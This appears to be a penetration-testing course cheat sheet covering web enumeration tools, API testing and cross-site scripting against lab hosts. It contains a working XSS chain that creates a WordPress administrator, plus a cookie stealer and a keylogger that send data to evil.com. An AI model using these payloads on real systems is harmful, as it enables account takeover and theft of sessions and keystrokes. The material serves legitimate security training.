# Web Application Assessment - Cheat Sheet & Walkthrough

## Table of Contents
1. [Web Application Assessment Methodology](#1-web-application-assessment-methodology)
2. [Web Application Assessment Tools](#2-web-application-assessment-tools)
3. [Web Application Enumeration](#3-web-application-enumeration)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [Quick Reference](#5-quick-reference)

---

## 1. Web Application Assessment Methodology

### Testing Methodologies

| Methodology | Information Provided | Characteristics |
|-------------|---------------------|-----------------|
| **White-Box** | Full source code, infrastructure, design docs | Comprehensive, time-intensive, code review required |
| **Black-Box** | No information (zero-knowledge) | Heavy enumeration, typical for bug bounties |
| **Grey-Box** | Limited info (credentials, framework details) | Balanced approach |

### OWASP Top 10 Overview
> The OWASP Top 10 is a periodically compiled list of the most critical security risks to web applications.

**Key Attack Vectors to Master**:
- Injection (SQL, Command, etc.)
- Broken Authentication
- Sensitive Data Exposure
- XXE (XML External Entities)
- Broken Access Control
- Security Misconfigurations
- XSS (Cross-Site Scripting)
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

---

## 2. Web Application Assessment Tools

### 2.1 Fingerprinting Web Servers with Nmap

```bash
# Basic service detection
sudo nmap -p80 -sV 192.168.50.20

# HTTP enumeration script
sudo nmap -p80 --script=http-enum 192.168.50.20
```

**What http-enum reveals**:
- Admin folders (`/login.php`)
- Database directories (`/db/`)
- Interesting directories with listings (`/css/`, `/images/`, `/js/`, `/uploads/`)

---

### 2.2 Technology Stack with Wappalyzer

**Purpose**: Passive identification of web technologies

**What Wappalyzer Reveals**:
- Operating System
- UI Framework
- Web Server
- JavaScript Libraries
- Analytics tools
- CMS platforms

**Example**: `megacorpone.com` reveals jQuery, Bootstrap, Font Awesome, Apache, etc.

---

### 2.3 Directory Brute Force with Gobuster

**Basic Syntax**:
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 5
```

**Parameters**:
| Parameter | Purpose |
|-----------|---------|
| `-u` | Target URL |
| `-w` | Wordlist path |
| `-t` | Number of threads (default 10) |
| `-p` | Pattern file for dynamic paths |

**Pattern File Example**:
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

**Common Wordlists**:
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/dirb/big.txt`
- `/usr/share/wordlists/dirb/small.txt`
- `/usr/share/wordlists/rockyou.txt`

**Response Codes to Know**:
| Code | Meaning |
|------|---------|
| 200 | OK |
| 301/302 | Redirect |
| 403 | Forbidden |
| 404 | Not Found |
| 405 | Method Not Allowed |

---

### 2.4 Burp Suite - The Proxy

#### Starting Burp Suite
```bash
# GUI
Applications → 03 Web Application Analysis → burpsuite

# CLI
burpsuite
```

#### Initial Setup
1. Choose **Temporary project** → **Next**
2. Leave **Use Burp defaults** selected
3. Click **Start Burp**

#### Configuring Firefox Proxy
1. Firefox → **about:preferences#general**
2. Scroll to **Network Settings** → Click **Settings**
3. Select **Manual proxy configuration**
4. HTTP Proxy: `127.0.0.1` | Port: `8080`
5. Check **Use this proxy server for all protocols**
6. Click **OK**

#### Disable Intercept for Browsing
- **Proxy** → **Intercept** tab
- Toggle **Intercept is on** to **Intercept is off**

#### Burp Suite Key Features

| Feature | Purpose | Use Case |
|---------|---------|----------|
| **Proxy** | Intercept/modify requests/responses | View/modify traffic |
| **Repeater** | Craft and resend requests | Test parameter manipulation |
| **Intruder** | Automated attacks (brute force, fuzzing) | Password attacks, parameter fuzzing |
| **Sequencer** | Analyze session tokens | Test randomness |
| **Decoder** | Encode/decode data | URL/Base64/HTML encoding |
| **Comparer** | Compare responses | Find differences |

#### Burp Repeater - Step by Step
1. **Proxy** → **HTTP History**
2. Right-click request → **Send to Repeater**
3. Switch to **Repeater** tab
4. Modify request as needed
5. Click **Send**
6. View response on right pane

#### Burp Intruder - Password Brute Force
1. **Proxy** → **HTTP History**
2. Right-click login POST → **Send to Intruder**
3. **Intruder** → **Positions**
4. Click **Clear** to clear all positions
5. Highlight password value → **Add**
6. **Payloads** → Paste wordlist
7. Click **Start Attack**

#### Burp Site Map
- **Target** → **Site map**
- Organizes discovered paths
- Useful for tracking API endpoints

#### Etc/Hosts Configuration
```bash
# For hostname-based applications
echo "192.168.50.16 offsecwp" >> /etc/hosts
```

---

## 3. Web Application Enumeration

### 3.1 Debugging Page Content

#### Firefox Developer Tools Access
- **Web Developer** menu
- Or: `Ctrl+Shift+I` (Inspector)
- Or: `Ctrl+Shift+E` (Network)
- Or: `Ctrl+Shift+K` (Console)

#### Key Developer Tools

| Tool | Purpose | Shortcut |
|------|---------|----------|
| **Inspector** | View/modify HTML/CSS | Ctrl+Shift+I |
| **Console** | Execute JavaScript, view logs | Ctrl+Shift+K |
| **Debugger** | Inspect JavaScript sources | Ctrl+Shift+S |
| **Network** | View HTTP requests/responses | Ctrl+Shift+E |
| **Storage** | View cookies, local storage | - |

#### Debugger - Pretty Print
1. Open **Debugger**
2. Click minified JS file
3. Click **Pretty print source** button (`{}` icon)
4. Read formatted code

#### Inspector - Finding Hidden Elements
1. Right-click element on page
2. Select **Inspect**
3. View HTML in Inspector
4. Look for hidden form fields, comments, etc.

---

### 3.2 Inspecting HTTP Response Headers

#### Using Firefox Network Tool
1. Open **Network** tool (`Ctrl+Shift+E`)
2. Refresh page
3. Click a request
4. View **Headers** tab

#### Common Informative Headers

| Header | What It Reveals |
|--------|-----------------|
| `Server` | Web server software/version |
| `X-Powered-By` | Programming language |
| `X-AspNet-Version` | .NET version |
| `x-amz-cf-id` | Amazon CloudFront |
| `X-Forwarded-For` | Original client IP (from proxy) |

#### Robots.txt & Sitemaps
```bash
# Check robots.txt
curl http://target/robots.txt

# Check sitemap
curl http://target/sitemap.xml
```

**robots.txt Directives**:
- `Allow: /path` - Allow crawling
- `Disallow: /path` - Block crawling

> 💡 **Tip**: Disallowed paths are often admin panels or sensitive pages!

---

### 3.3 API Testing Methodology

#### Common API Path Patterns
```
/api_name/v1
/api_name/v2
/api_name/v1/resource
```

#### Finding APIs with Gobuster
```bash
# Using pattern file
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

# Example pattern file
{GOBUSTER}/v1
{GOBUSTER}/v2
```

#### Testing API Endpoints

**1. GET Request (Default)**:
```bash
curl -i http://192.168.50.16:5002/users/v1
```

**2. POST Request**:
```bash
curl -d '{"username":"admin","password":"test"}' \
     -H 'Content-Type: application/json' \
     http://192.168.50.16:5002/users/v1/login
```

**3. PUT Request (Update)**:
```bash
curl -X 'PUT' \
     -H 'Content-Type: application/json' \
     -H 'Authorization: OAuth TOKEN_HERE' \
     -d '{"password":"newpass"}' \
     http://192.168.50.16:5002/users/v1/admin/password
```

**4. DELETE Request**:
```bash
curl -X 'DELETE' \
     -H 'Authorization: OAuth TOKEN_HERE' \
     http://192.168.50.16:5002/users/v1/admin
```

#### Common HTTP Methods for APIs

| Method | Purpose | Example |
|--------|---------|---------|
| GET | Retrieve data | `/users/v1` |
| POST | Create resource | `/users/v1/register` |
| PUT | Update resource | `/users/v1/admin/password` |
| PATCH | Partial update | `/users/v1/admin/email` |
| DELETE | Remove resource | `/users/v1/admin` |

#### Response Codes to Watch

| Code | Meaning | Implication |
|------|---------|-------------|
| 200 | OK | Successful request |
| 201 | Created | Resource created |
| 400 | Bad Request | Malformed request |
| 401 | Unauthorized | Authentication required |
| 403 | Forbidden | Not permitted |
| 404 | Not Found | Endpoint doesn't exist |
| 405 | Method Not Allowed | Endpoint exists but wrong method |

#### API Vulnerability Checklist
- [ ] Can you create admin accounts via registration?
- [ ] Are endpoints accessible without authentication?
- [ ] Can you modify other users' data?
- [ ] Are rate limits in place?
- [ ] Are input validation checks bypassable?
- [ ] Does the API leak sensitive data?
- [ ] Can you enumerate users/resources?

---

## 4. Cross-Site Scripting (XSS)

### 4.1 XSS Theory

#### What is XSS?
> Vulnerability that exploits a user's trust in a website by injecting client-side scripts into pages rendered by the browser.

#### XSS Types

| Type | Description | Storage | Example Location |
|------|-------------|---------|------------------|
| **Stored (Persistent)** | Payload stored in database | Server-side | Comments, forum posts |
| **Reflected** | Payload in request/URL | Not stored | Search fields, error messages |
| **DOM-based** | Payload modifies page DOM | Client-side | Client-side JavaScript |

#### Special Characters for XSS Testing
```
< > ' " { } ;
```

**Why These Characters**:
- `< >` - HTML element syntax
- `{ }` - JavaScript functions
- `' "` - String delimiters
- `;` - End of statement

#### Testing for XSS
1. Find user-controlled input
2. Input special characters: `< > ' " { } ;`
3. Observe if characters are filtered/encoded
4. If not, likely vulnerable

### 4.2 JavaScript Refresher

#### Basic JavaScript Function
```javascript
function multiplyValues(x, y) {
    return x * y;
}

let a = multiplyValues(3, 5);
console.log(a);
```

#### String to Code Execution
```javascript
// Using eval()
eval("alert(42)");

// Using String.fromCharCode + eval
eval(String.fromCharCode(97,108,101,114,116,40,52,50,41));
```

#### Key JavaScript Methods for XSS

| Method | Purpose | Example |
|--------|---------|---------|
| `alert()` | Show pop-up | `alert("XSS")` |
| `console.log()` | Log to console | `console.log("debug")` |
| `document.cookie` | Access cookies | `document.cookie` |
| `XMLHttpRequest` | Make HTTP requests | New XHR object |
| `fetch()` | Modern HTTP requests | `fetch(url)` |
| `eval()` | Execute string as code | `eval("alert(1)")` |

---

### 4.3 Identifying XSS Vulnerabilities

#### Case Study: Visitors WordPress Plugin

**Vulnerable Code Analysis**:

```php
// database.php - Record Creation
function VST_save_record() {
    return $wpdb->insert(
        $table_name,
        array(
            'useragent' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
        )
    );
}

// start.php - Record Display
foreach(VST_get_records() as $record) {
    echo '<td>'.$record->useragent.'</td>';
}
```

**Issue**: User-Agent saved directly from HTTP header, displayed unsanitized.

#### Exploiting XSS via User-Agent

**1. Create Payload**:
```html
<script>alert(42)</script>
```

**2. Send Request**:
```bash
curl -i http://offsecwp --user-agent "<script>alert(42)</script>" \
     --proxy 127.0.0.1:8080
```

**3. Trigger Payload**:
- Log in as admin
- Visit Visitors plugin dashboard
- Alert pops up

---

### 4.4 Privilege Escalation via XSS

#### Cookie Theft Considerations

**Secure Cookie Flags**:
| Flag | Effect | Impact on XSS |
|------|--------|---------------|
| `Secure` | Only sent over HTTPS | Prevents interception |
| `HttpOnly` | Not accessible via JS | **Blocks cookie theft** |

> ⚠️ If HttpOnly is set, JavaScript cannot access cookies!

#### Nonce (CSRF Token)
- Server-generated token
- Prevents Cross-Site Request Forgery
- Must be included in admin actions

#### XSS Payload to Create Admin User

**Step 1: Extract Nonce**:
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**Step 2: Create Admin Account**:
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+
             "&user_login=attacker&email=attacker@offsec.com"+
             "&pass1=attackerpass&pass2=attackerpass"+
             "&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", 
    "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### Encoding XSS Payloads

**JavaScript Encoding Function**:
```javascript
function encode_to_javascript(string) {
    var output = '';
    for(pos = 0; pos < string.length; pos++) {
        output += string.charCodeAt(pos);
        if(pos != (string.length - 1)) {
            output += ",";
        }
    }
    return output;
}
```

**Decoding and Executing**:
```javascript
eval(String.fromCharCode(118,97,114,32,97,106,97,120,...));
```

#### Final Attack Command
```bash
curl -i http://offsecwp \
     --user-agent "<script>eval(String.fromCharCode(ENCODED_PAYLOAD))</script>" \
     --proxy 127.0.0.1:8080
```

---

### 4.5 XSS Prevention

| Technique | Description |
|-----------|-------------|
| **Input Validation** | Whitelist allowed characters |
| **Output Encoding** | HTML/URL encode special chars |
| **Content Security Policy** | Restrict script sources |
| **HttpOnly Flag** | Prevent JS cookie access |
| **Secure Flag** | HTTPS-only cookies |
| **XSS Filter** | Browser built-in protection |

---

## 5. Quick Reference

### Common Commands

#### Nmap Web Enumeration
```bash
# Web server version
sudo nmap -p80 -sV TARGET

# HTTP enumeration
sudo nmap -p80 --script=http-enum TARGET
```

#### Gobuster
```bash
# Directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 5

# With patterns
gobuster dir -u http://TARGET:PORT -w /usr/share/wordlists/dirb/big.txt -p pattern

# DNS subdomain brute force
gobuster dns -d domain.com -w wordlist.txt -t 10
```

#### cURL for Web Testing
```bash
# Basic GET
curl -i http://TARGET

# POST JSON
curl -d '{"key":"value"}' -H 'Content-Type: application/json' http://TARGET/api

# Custom headers
curl -H "User-Agent: custom" -H "X-Forwarded-For: 127.0.0.1" http://TARGET

# With proxy
curl --proxy 127.0.0.1:8080 http://TARGET
```

#### Burp Suite
```bash
# Start Burp
burpsuite

# Default proxy
127.0.0.1:8080
```

### XSS Payloads Quick Reference

#### Basic Test
```html
<script>alert(1)</script>
<script>alert("XSS")</script>
```

#### Without Script Tags
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

#### Cookie Stealer
```html
<script>new Image().src="http://evil.com/steal?cookie="+document.cookie;</script>
```

#### Keylogger Example
```html
<script>
document.onkeypress = function(e) {
    new Image().src = "http://evil.com/log?key=" + e.key;
}
</script>
```

### Web Application Enumeration Checklist

- [ ] Port scan (Nmap)
- [ ] Service version detection
- [ ] HTTP enumeration script
- [ ] Technology stack (Wappalyzer)
- [ ] Directory brute force (Gobuster)
- [ ] Check robots.txt
- [ ] Check sitemap.xml
- [ ] Review source code for comments
- [ ] Analyze JavaScript files
- [ ] Inspect cookies (Secure/HttpOnly)
- [ ] Test HTTP methods
- [ ] Enumerate APIs
- [ ] Test XSS entry points
- [ ] Test CSRF protections

---

### Key Takeaways

| Concept          | Key Points                                    |
| ---------------- | --------------------------------------------- |
| **Methodology**  | White/Black/Grey box testing                  |
| **OWASP Top 10** | Critical web application risks                |
| **Gobuster**     | Directory/file brute forcing                  |
| **Burp Suite**   | Proxy, Repeater, Intruder, Repeater           |
| **XSS**          | Stored, Reflected, DOM-based                  |
| **Nonce**        | CSRF protection token                         |
| **HttpOnly**     | Prevents cookie theft via JS                  |
| **API Testing**  | Test all HTTP methods, bypass access controls |